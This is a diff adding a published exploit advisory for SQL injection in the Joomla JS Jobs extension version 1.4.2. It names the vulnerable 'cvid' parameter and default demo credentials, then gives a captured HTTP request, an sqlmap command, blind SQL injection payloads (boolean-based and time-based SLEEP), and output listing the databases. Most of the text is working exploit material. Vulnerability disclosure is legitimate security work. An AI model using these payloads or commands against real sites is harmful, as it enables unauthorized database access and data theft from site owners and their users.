@@ -1,0 +1,65 @@
+# Exploit Title: Joomla JS Jobs plugin 1.4.2 - SQL injection
+# Google Dork: n/a
+# Date: 07/07/2025
+# Exploit Author: Adam Wallwork
+# Vendor Homepage: https://joomsky.com/
+# Demo: https://demo.joomsky.com/js-jobs/jm/free/
+# Software Link: https://extensions.joomla.org/extension/js-jobs/
+# Version: v1.4.2
+# Tested on: v1.4.2
+
+
+An SQL injection vulnerability exists in the JS Jobs extension (v1.4.2) via the 'cvid' parameter and is exploitable as the jobseeker user.
+
+To exploit this vulnerability login as the jobseeker user with default credentials (jobseeker:demo) and go to 'jobseeker-controlpanel >> My Stuff >> Newest Jobs >> Newest Jobs >> Apply Now >> Apply Now' and capture the "Apply Now" request (req.txt).
+
+HTTP Request:
+```
+POST /index.php?option=com_jsjobs&task=jobapply.jobapplyajax HTTP/2
+Host: localhost:8080
+Cookie: joomla_user_state=logged_in; 67aa5f9b49e233456b916ea62ef1447b=kjou43pssdvaa5plr84dhc8P64
+Content-Length: 38
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-GB,en;q=0.9
+Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+Accept: */*
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://localhost:8080
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8080/index.php/component/jsjobs/newest-jobs?Itemid=
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+jobid=1&cvid=1&coverletterid=4&uid=460
+```
+
+Exploit:
+```
+sqlmap -r req.txt --dbs --batch -p cvid --dbms=mysql --threads=10
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.1.2#dev}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+---
+Parameter: cvid (POST)
+Type: boolean-based blind
+Title: Boolean-based blind - Parameter replace (original value)
+Payload: jobid=1&cvid=(SELECT (CASE WHEN (7270=7270) THEN 1 ELSE (SELECT 6098 UNION SELECT 7386) END))&coverletterid=4&uid=460
+
+Type: time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+Payload: jobid=1&cvid=1 AND (SELECT 6497 FROM (SELECT(SLEEP(5)))EAyv)&coverletterid=4&uid=460
+---
+
+available databases [2]:
+[*] joomla_db
+[*] information_schema
+```
